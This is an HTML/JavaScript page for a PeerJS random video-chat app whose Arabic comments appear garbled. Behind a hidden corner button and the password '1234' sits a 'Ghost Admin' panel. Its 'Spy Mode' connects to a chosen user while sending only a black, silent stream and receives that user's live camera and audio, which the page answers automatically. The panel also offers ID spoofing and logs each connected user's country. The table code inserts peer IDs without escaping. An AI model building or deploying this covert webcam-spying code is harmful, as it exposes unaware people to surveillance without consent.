<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ghost Admin | Surveillance System</title>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
    <style>
        /* === ÿ™ÿµŸÖŸäŸÖ ÿßŸÑÿ∏ŸÑÿßŸÖ ŸàÿßŸÑŸáÿßŸÉÿ± === */
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Consolas', 'Courier New', monospace; }
        
        body { 
            background: #050505; 
            color: #0f0; 
            height: 100vh; 
            display: flex; 
            flex-direction: column; 
            overflow: hidden;
        }

        /* ÿ¥ÿßÿ¥ÿ© ÿßŸÑÿØÿÆŸàŸÑ */
        #loginScreen {
            flex: 1; display: flex; flex-direction: column;
            align-items: center; justify-content: center;
            background: radial-gradient(circle, #111 0%, #000 100%);
        }

        .card {
            background: #000; border: 1px solid #0f0; padding: 30px;
            width: 100%; max-width: 450px; text-align: center;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
        }

        h1 { color: #0f0; margin-bottom: 20px; text-transform: uppercase; letter-spacing: 2px; }
        
        .id-display {
            font-size: 2rem; border: 1px dashed #0f0; padding: 10px; margin: 15px 0; color: white;
        }

        input {
            width: 100%; padding: 12px; margin-bottom: 10px; 
            background: #111; border: 1px solid #004400; color: #0f0; text-align: center;
        }
        input:focus { border-color: #0f0; outline: none; }

        button {
            width: 100%; padding: 12px; border: 1px solid #0f0; background: #002200;
            color: #0f0; cursor: pointer; font-weight: bold; margin-top: 5px; text-transform: uppercase;
        }
        button:hover { background: #0f0; color: black; }

        /* ÿ¥ÿßÿ¥ÿ© ÿßŸÑÿ¥ÿßÿ™ */
        #chatScreen { display: none; flex-direction: column; height: 100%; }

        .header {
            padding: 10px; border-bottom: 1px solid #0f0; background: #001100;
            display: flex; justify-content: space-between; align-items: center;
        }

        #videoContainer {
            display: flex; height: 50vh; background: black; border-bottom: 1px solid #0f0;
        }
        .vid-box { flex: 1; position: relative; border-right: 1px solid #004400; }
        video { width: 100%; height: 100%; object-fit: cover; }
        
        .label {
            position: absolute; bottom: 5px; right: 5px; background: black; color: #0f0;
            padding: 2px 5px; font-size: 0.8rem; border: 1px solid #0f0;
        }

        .logs {
            flex: 1; padding: 10px; overflow-y: auto; background: #000;
        }
        .msg { margin-bottom: 5px; padding: 5px; border-left: 2px solid; font-size: 0.9rem; }
        .msg-me { border-color: #0f0; color: #ccc; }
        .msg-remote { border-color: red; color: white; }

        .input-bar { padding: 10px; border-top: 1px solid #0f0; display: flex; gap: 10px; }

        /* === LOADER === */
        #loader {
            position: absolute; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9);
            display:none; align-items:center; justify-content:center; flex-direction:column; z-index: 5000;
        }
        .radar {
            width: 60px; height: 60px; border: 2px solid #0f0; border-radius: 50%;
            border-top-color: transparent; animation: spin 1s infinite linear;
        }
        @keyframes spin { 100% { transform: rotate(360deg); } }

        /* === ADMIN PANEL === */
        #secretBtn {
            position: fixed; bottom: 0; left: 0; width: 30px; height: 30px; z-index: 9999;
        }
        
        #adminModal {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: black; z-index: 10000; flex-direction: column; padding: 20px;
        }

        .admin-nav {
            display: flex; justify-content: space-between; border-bottom: 2px solid #0f0; padding-bottom: 10px; margin-bottom: 20px;
        }

        .panel-section {
            border: 1px solid #333; padding: 15px; margin-bottom: 15px; background: #050505;
        }
        .panel-title { color: #0f0; border-bottom: 1px dashed #0f0; margin-bottom: 10px; }

        /* ÿ¨ÿØŸàŸÑ ÿßŸÑŸÖÿ™ÿµŸÑŸäŸÜ */
        table { width: 100%; border-collapse: collapse; font-size: 0.8rem; }
        th, td { border: 1px solid #333; padding: 5px; text-align: left; color: #ccc; }
        th { color: #0f0; }
        .status-online { color: #0f0; }
        .status-offline { color: #555; }

        .btn-spy { background: #330000; border-color: red; color: red; font-size: 0.7rem; padding: 2px 5px; }
        .btn-spy:hover { background: red; color: white; }

    </style>
</head>
<body>

    <!-- ÿ±ÿßÿØÿßÿ± ÿßŸÑÿ®ÿ≠ÿ´ -->
    <div id="loader">
        <div class="radar"></div>
        <div style="margin-top:10px; color:#0f0;">SCANNING NETWORK...</div>
    </div>

    <!-- 1. ÿ¥ÿßÿ¥ÿ© ÿßŸÑÿØÿÆŸàŸÑ -->
    <div id="loginScreen">
        <div class="card">
            <h1>SYSTEM LOGIN</h1>
            
            <p style="font-size:0.8rem; color:#777;">MY ID:</p>
            <div class="id-display" id="myIdDisplay">...</div>
            
            <!-- ŸÖŸäÿ≤ÿ© ÿ™ÿ∫ŸäŸäÿ± ÿßŸÑÿ±ŸÇŸÖ ŸÑŸÑÿ£ÿØŸÖŸÜ -->
            <div id="adminIdControls" style="display:none; margin-bottom:10px;">
                <input type="text" id="customIdInput" placeholder="Set Custom ID (e.g. ADMIN)">
                <button onclick="setCustomId()">Update ID</button>
            </div>

            <input type="text" id="targetInput" placeholder="Target ID">
            <button onclick="connectManual()">Connect</button>
            <button onclick="startRandom()">Auto Scan (Random)</button>
        </div>
    </div>

    <!-- 2. ÿ¥ÿßÿ¥ÿ© ÿßŸÑÿ¥ÿßÿ™ -->
    <div id="chatScreen">
        <div class="header">
            <span>SECURE CONNECTION</span>
            <button onclick="location.reload()" style="width:auto; padding:5px; background:red; border-color:red; color:white;">DISCONNECT</button>
        </div>

        <div id="videoContainer">
            <div class="vid-box">
                <video id="localVideo" autoplay muted></video>
                <div class="label">ME</div>
            </div>
            <div class="vid-box">
                <video id="remoteVideo" autoplay></video>
                <div class="label">TARGET</div>
            </div>
        </div>

        <div class="logs" id="msgLogs"></div>

        <div class="input-bar">
            <input type="text" id="msgInput" placeholder="Message..." onkeypress="handleEnter(event)">
            <button style="width:auto;" onclick="sendMsg()">SEND</button>
        </div>
    </div>

    <!-- 3. ŸÑŸàÿ≠ÿ© ÿßŸÑÿ£ÿØŸÖŸÜ -->
    <div id="secretBtn" onclick="toggleAdmin()"></div>

    <div id="adminModal">
        <div class="admin-nav">
            <h2>üïµÔ∏è‚Äç‚ôÇÔ∏è GHOST ADMIN PANEL</h2>
            <button onclick="toggleAdmin()" style="width:auto; border-color:red; color:red;">EXIT</button>
        </div>

        <div style="overflow-y: auto; flex: 1;">
            
            <!-- ŸÇÿ≥ŸÖ 1: ÿßŸÑÿ™ÿ≠ŸÉŸÖ ŸÅŸä ÿßŸÑŸáŸàŸäÿ© -->
            <div class="panel-section">
                <div class="panel-title">üÜî IDENTITY SPOOFING</div>
                <p style="font-size:0.8rem; color:#777;">Set a custom VIP ID for yourself:</p>
                <input type="text" id="admCustomId" placeholder="Ex: ADMIN_007">
                <button onclick="adminChangeId()">Apply New ID</button>
            </div>

            <!-- ŸÇÿ≥ŸÖ 2: ÿßŸÑÿ™ÿ¨ÿ≥ÿ≥ ÿßŸÑŸÖÿ®ÿßÿ¥ÿ± -->
            <div class="panel-section">
                <div class="panel-title">üëÅÔ∏è SPY MODE (Silent Connection)</div>
                <p style="font-size:0.8rem; color:#777;">Connect without sending video/audio:</p>
                <input type="text" id="spyTargetId" placeholder="Target ID to Spy on">
                <button onclick="startSpy()">INITIATE SPY LINK</button>
            </div>

            <!-- ŸÇÿ≥ŸÖ 3: ÿ±ÿßÿØÿßÿ± ÿßŸÑŸÖÿ™ÿµŸÑŸäŸÜ -->
            <div class="panel-section">
                <div class="panel-title">üì° DETECTED USERS (HISTORY)</div>
                <div style="display:flex; justify-content:space-between; margin-bottom:5px;">
                    <span style="font-size:0.7rem; color:#777;">Users detected during this session:</span>
                    <button style="width:auto; padding:2px; font-size:0.7rem;" onclick="clearHistory()">Clear</button>
                </div>
                
                <table>
                    <thead>
                        <tr>
                            <th>ID</th>
                            <th>LOC</th>
                            <th>ACTION</th>
                        </tr>
                    </thead>
                    <tbody id="userTableBody">
                        <!-- ÿ≥Ÿäÿ™ŸÖ ŸÖŸÑÿ° ÿßŸÑÿ¨ÿØŸàŸÑ ÿ™ŸÑŸÇÿßÿ¶ŸäÿßŸã -->
                    </tbody>
                </table>
            </div>

        </div>
    </div>

    <script>
        // ÿ•ÿπÿØÿßÿØÿßÿ™ ÿ£ŸàŸÑŸäÿ©
        let myId = localStorage.getItem('savedId') || Math.floor(1000 + Math.random() * 9000).toString();
        document.getElementById('myIdDisplay').innerText = myId;
        document.getElementById('admCustomId').value = myId;

        let peer = new Peer(myId);
        let conn = null;
        let call = null;
        let localStream = null;
        let detectedUsers = JSON.parse(localStorage.getItem('detectedUsers') || "[]");

        // ÿ¨ŸÑÿ® ŸÖÿπŸÑŸàŸÖÿßÿ™Ÿä ÿßŸÑÿ≠ŸÇŸäŸÇŸäÿ©
        let myInfo = { country: "N/A" };
        fetch('https://ipapi.co/json/').then(r=>r.json()).then(d => myInfo.country = d.country_code);

        // --- PEERJS EVENTS ---
        peer.on('open', id => { console.log('My ID:', id); });

        peer.on('connection', c => {
            conn = c;
            handleConnection();
        });

        peer.on('call', incomingCall => {
            navigator.mediaDevices.getUserMedia({video:true, audio:true}).then(stream => {
                localStream = stream;
                document.getElementById('localVideo').srcObject = stream;
                incomingCall.answer(stream);
                call = incomingCall;
                call.on('stream', rs => document.getElementById('remoteVideo').srcObject = rs);
                
                // ÿ≠ŸÅÿ∏ ÿßŸÑŸÖÿ™ÿµŸÑ ŸÅŸä ÿßŸÑŸÇÿßÿ¶ŸÖÿ©
                addToDetected(incomingCall.peer);
                
                showChat();
            });
        });

        // --- Ÿàÿ∏ÿßÿ¶ŸÅ ÿßŸÑÿßÿ™ÿµÿßŸÑ ---
        function startRandom() {
            document.getElementById('loader').style.display = 'flex';
            // ŸÖÿ≠ÿßŸÉÿßÿ© ÿ®ÿ≠ÿ´: ŸÜÿ¨ÿ±ÿ® ÿ£ÿ±ŸÇÿßŸÖ ŸÇÿ±Ÿäÿ®ÿ© ÿ£Ÿà ÿπÿ¥Ÿàÿßÿ¶Ÿäÿ©
            let randomTry = Math.floor(1000 + Math.random() * 9000).toString();
            manualConnectLogic(randomTry);
        }

        function connectManual() {
            let id = document.getElementById('targetInput').value;
            if(!id) return alert("Enter ID");
            manualConnectLogic(id);
        }

        function manualConnectLogic(id) {
            navigator.mediaDevices.getUserMedia({video:true, audio:true}).then(stream => {
                localStream = stream;
                document.getElementById('localVideo').srcObject = stream;
                
                conn = peer.connect(id);
                conn.on('open', () => {
                    handleConnection();
                    call = peer.call(id, stream);
                    call.on('stream', rs => document.getElementById('remoteVideo').srcObject = rs);
                    
                    addToDetected(id);
                    document.getElementById('loader').style.display = 'none';
                    showChat();
                });

                // ÿ•ÿ∞ÿß ŸÑŸÖ ŸäŸàÿ¨ÿØ
                peer.on('error', err => {
                    document.getElementById('loader').style.display = 'none';
                    alert("User not found or offline.");
                });
            });
        }

        function handleConnection() {
            // ÿ™ÿ®ÿßÿØŸÑ ÿßŸÑŸÖÿπŸÑŸàŸÖÿßÿ™
            conn.send({ type: 'INFO', country: myInfo.country });
            
            conn.on('data', data => {
                if(data.type === 'INFO') {
                    updateUserCountry(conn.peer, data.country);
                } else {
                    addLog(conn.peer + ": " + data, 'remote');
                }
            });
        }

        // --- ADMIN FEATURES ---

        // 1. ÿ™ÿ∫ŸäŸäÿ± ÿßŸÑÿ¢ŸäÿØŸä
        function adminChangeId() {
            let newId = document.getElementById('admCustomId').value;
            if(newId) {
                localStorage.setItem('savedId', newId);
                alert("ID Updated! Page will reload.");
                location.reload();
            }
        }

        // 2. Ÿàÿ∂ÿπ ÿßŸÑÿ™ÿ¨ÿ≥ÿ≥ (Spy Mode)
        function startSpy() {
            let target = document.getElementById('spyTargetId').value;
            if(!target) return alert("Enter Target ID");
            
            toggleAdmin(); // ÿ•ÿ∫ŸÑÿßŸÇ ŸÑŸàÿ≠ÿ© ÿßŸÑÿ£ÿØŸÖŸÜ
            document.getElementById('loader').style.display = 'flex';

            // ÿßŸÑÿ≠ŸäŸÑÿ©: ÿ•ŸÜÿ¥ÿßÿ° ÿ™Ÿäÿßÿ± ŸÅÿßÿ±ÿ∫ (ÿ¥ÿßÿ¥ÿ© ÿ≥ŸàÿØÿßÿ°)
            let canvas = document.createElement('canvas');
            canvas.width = 640; canvas.height = 480;
            let ctx = canvas.getContext('2d');
            ctx.fillStyle = "black";
            ctx.fillRect(0,0,640,480);
            
            // ŸÜÿ≠ÿµŸÑ ÿπŸÑŸâ Stream ÿ£ÿ≥ŸàÿØ ŸàÿµÿßŸÖÿ™
            let spyStream = canvas.captureStream(30); 
            // ÿ•ÿ∂ÿßŸÅÿ© ÿ™ÿ±ÿßŸÉ ÿµŸàÿ™Ÿä ÿµÿßŸÖÿ™ (ŸÖŸáŸÖ ŸÑŸÉŸä ŸäŸÇÿ®ŸÑ ÿßŸÑŸÖÿ™ÿµŸÅÿ≠ ÿßŸÑÿßÿ™ÿµÿßŸÑ)
            let audioCtx = new AudioContext();
            let dest = audioCtx.createMediaStreamDestination();
            spyStream.addTrack(dest.stream.getAudioTracks()[0]);

            // ÿßŸÑÿßÿ™ÿµÿßŸÑ
            conn = peer.connect(target);
            conn.on('open', () => {
                // ŸÜÿ∑ŸÑÿ® ÿßŸÑŸÅŸäÿØŸäŸà ŸÖŸÜŸáÿå ŸàŸÜÿ±ÿ≥ŸÑ ŸÑŸá ÿßŸÑÿ¥ÿßÿ¥ÿ© ÿßŸÑÿ≥ŸàÿØÿßÿ°
                call = peer.call(target, spyStream);
                
                call.on('stream', remoteStream => {
                    // ŸÜÿ¨ÿ≠ ÿßŸÑÿ™ÿ¨ÿ≥ÿ≥! ŸÜÿ±Ÿâ ÿßŸÑŸÅŸäÿØŸäŸà ÿßŸÑÿÆÿßÿµ ÿ®Ÿá
                    document.getElementById('loader').style.display = 'none';
                    document.getElementById('localVideo').srcObject = spyStream; // ÿ£ŸÜÿß ÿ£ÿ±Ÿâ ÿßŸÑÿ£ÿ≥ŸàÿØ
                    document.getElementById('remoteVideo').srcObject = remoteStream; // ÿ£ÿ±Ÿâ ÿßŸÑÿ∂ÿ≠Ÿäÿ©
                    showChat();
                    addLog("üïµÔ∏è‚Äç‚ôÇÔ∏è SPY CONNECTION ESTABLISHED", 'me');
                });
            });
        }

        // 3. ÿ¨ÿØŸàŸÑ ÿßŸÑŸÖÿ™ÿµŸÑŸäŸÜ (Network List)
        function addToDetected(id) {
            // ÿßŸÑÿ™ÿ≠ŸÇŸÇ ŸÖŸÜ ÿπÿØŸÖ ÿßŸÑÿ™ŸÉÿ±ÿßÿ±
            let exists = detectedUsers.find(u => u.id === id);
            if(!exists) {
                detectedUsers.push({ id: id, country: '...' });
                saveAndRenderUsers();
            }
        }

        function updateUserCountry(id, country) {
            let user = detectedUsers.find(u => u.id === id);
            if(user) {
                user.country = country;
                saveAndRenderUsers();
            }
        }

        function saveAndRenderUsers() {
            localStorage.setItem('detectedUsers', JSON.stringify(detectedUsers));
            renderUserTable();
        }

        function renderUserTable() {
            let tbody = document.getElementById('userTableBody');
            tbody.innerHTML = '';
            detectedUsers.forEach(u => {
                let row = `
                    <tr>
                        <td style="color:#fff">${u.id}</td>
                        <td>${u.country}</td>
                        <td>
                            <button class="btn-spy" onclick="spyOnUser('${u.id}')">SPY</button>
                        </td>
                    </tr>
                `;
                tbody.innerHTML += row;
            });
        }
        
        function spyOnUser(id) {
            document.getElementById('spyTargetId').value = id;
            startSpy();
        }

        function clearHistory() {
            detectedUsers = [];
            saveAndRenderUsers();
        }

        // --- Ÿàÿßÿ¨Ÿáÿ© ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ ---
        function toggleAdmin() {
            let modal = document.getElementById('adminModal');
            if(modal.style.display === 'flex') {
                modal.style.display = 'none';
            } else {
                let pass = prompt("ENTER ADMIN PASSWORD:"); // ÿ≠ŸÖÿßŸäÿ© ÿ®ÿ≥Ÿäÿ∑ÿ©
                if(pass === '1234') {
                    modal.style.display = 'flex';
                    renderUserTable();
                }
            }
        }

        function showChat() {
            document.getElementById('loginScreen').style.display = 'none';
            document.getElementById('chatScreen').style.display = 'flex';
        }

        function sendMsg() {
            let inp = document.getElementById('msgInput');
            if(conn && inp.value) {
                conn.send(inp.value);
                addLog("ME: " + inp.value, 'me');
                inp.value = '';
            }
        }

        function addLog(txt, type) {
            let div = document.createElement('div');
            div.className = 'msg ' + (type==='me'?'msg-me':'msg-remote');
            div.innerText = txt;
            document.getElementById('msgLogs').appendChild(div);
        }
        function handleEnter(e) { if(e.key === 'Enter') sendMsg(); }

        // ÿ™ÿ¥ÿ∫ŸäŸÑ ÿßŸÑÿ¨ÿØŸàŸÑ ÿπŸÜÿØ ÿßŸÑÿ®ÿØÿ°
        renderUserTable();

    </script>
</body>
</html>
